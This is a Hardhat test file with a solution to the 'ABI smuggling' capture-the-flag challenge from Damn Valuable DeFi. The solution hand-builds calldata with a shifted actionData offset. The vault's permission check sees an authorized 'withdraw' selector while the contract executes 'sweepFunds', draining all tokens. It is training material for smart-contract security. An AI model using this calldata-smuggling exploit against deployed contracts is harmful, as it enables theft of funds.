const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] ABI smuggling", function () {
    let deployer, player, recovery;
    let token, vault;

    const VAULT_TOKEN_BALANCE = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player, recovery] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory("DamnValuableToken", deployer)).deploy();

        // Deploy Vault
        vault = await (await ethers.getContractFactory("SelfAuthorizedVault", deployer)).deploy();
        expect(await vault.getLastWithdrawalTimestamp()).to.not.eq(0);

        // Set permissions
        const deployerPermission = await vault.getActionId("0x85fb709d", deployer.address, vault.address);
        const playerPermission = await vault.getActionId("0xd9caed12", player.address, vault.address);
        await vault.setPermissions([deployerPermission, playerPermission]);
        expect(await vault.permissions(deployerPermission)).to.be.true;
        expect(await vault.permissions(playerPermission)).to.be.true;

        // Make sure Vault is initialized
        expect(await vault.initialized()).to.be.true;

        // Deposit tokens into the vault
        await token.transfer(vault.address, VAULT_TOKEN_BALANCE);

        expect(await token.balanceOf(vault.address)).to.eq(VAULT_TOKEN_BALANCE);
        expect(await token.balanceOf(player.address)).to.eq(0);

        // Cannot call Vault directly
        await expect(vault.sweepFunds(deployer.address, token.address)).to.be.revertedWithCustomError(vault, "CallerNotAllowed");
        await expect(vault.connect(player).withdraw(token.address, player.address, 10n ** 18n)).to.be.revertedWithCustomError(
            vault,
            "CallerNotAllowed"
        );
    });

    it("Execution", async function () {
        /** CODE YOUR SOLUTION HERE */
        // https://docs.soliditylang.org/en/v0.8.24/abi-spec.html#function-selector-and-argument-encoding
        /**
         *  How the AuthorizedExecutor expect the data to arrive
         *
         *  execute
         *  signature     target         actionData data location   actionData length  actionData (selector + data) -> this selector is validated
         * | ---- | -------------------- | -------------------- | -------------------- | -------------------- |
         *
         * How we can abuse it:
         *
         * execute                                                                          withdraw (because we're authorized for it)
         * signature      target           actionData data loc    randomData (for offset)   signature             actionData length  actionData (selector + data)
         * | ---- | -------------------- | -------------------- | -------------------- | -------------------- | -------------------- | -------------------- |
         *
         * So what we did is:
         * - we shifted the `getActionId` to look at the selector we're authorized to use by:
         * --- adjusting `actionData location` from 0x60 (96b from start, hence 3 * 32 in code) to 0x80, which will point to actionData length
         * --- adding a filler `randomData`
         * --- adding `withdraw` calldata to make the contract think we're going to execute that one (since it's sitting at 4 + 32 * 3)
         * - now we're authorized to execute "withdraw"
         * - once `actionData` is passed to the `target.functionCall()`:
         * --- `actionData location` points to `actionData length`
         * --- `actionData length` specifies that Solidity should read the next 68 bytes
         * --- those 68 bytes contain the malicious selector+calldata that will now be called by the contract itself, bypassing any access control (like `onlyThis`)
         */
        const abiCoder = ethers.utils.defaultAbiCoder;

        const executeSelector = vault.interface.getSighash("execute"); //   1. execute(address,bytes) -> entry point to the vault
        const target = abiCoder.encode(["address"], [vault.address]); //    2. target -> for actionData
        const actionDataLocation = abiCoder.encode(["uint256"], [100]); //  3. action data -> location in bytes from start: address (padded to 32b) + data location (32b) + randomData (32b) + withdraw selector (4b) = 100 bytes
        const randomData = abiCoder.encode(["uint256"], [0]); //            4. randomData -> filler to fulfill the 3 * 32 offset (this is the 3rd 32b)
        const withdrawSelector = vault.interface.getSighash("withdraw"); // 5. withdraw(address,address,uint256) -> call that we're authorized for and that's going to be checked
        const actionDataLength = abiCoder.encode(["uint256"], [68]); //     6. action data length -> because it's a bytes array, we must specify length: sweepFunds selector (4b) + receiver address (32b) + token address (32b) = 68 bytes
        const sweepFundsCalldata = vault.interface.encodeFunctionData("sweepFunds", [recovery.address, token.address]); // finally, the malicious `sweepFunds` call

        console.log("Execute selector: \t" + executeSelector);
        console.log("Target: \t\t" + target);
        console.log("Action data location: \t" + actionDataLocation);
        console.log("Random data: \t\t" + randomData);
        console.log("Withdraw selector: \t" + withdrawSelector);
        console.log("Action data length: \t" + actionDataLength);
        console.log("SweepFunds selector: \t" + sweepFundsCalldata);

        const calldata = ethers.utils.hexConcat([
            executeSelector,
            target,
            actionDataLocation,
            randomData,
            withdrawSelector,
            actionDataLength,
            sweepFundsCalldata
        ]);

        console.log("\n--> Final calldata: \t", calldata);

        await player.sendTransaction({
            from: player.address,
            to: vault.address,
            data: calldata,
            gasLimit: 3_000_000
        });
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        expect(await token.balanceOf(vault.address)).to.eq(0);
        expect(await token.balanceOf(player.address)).to.eq(0);
        expect(await token.balanceOf(recovery.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
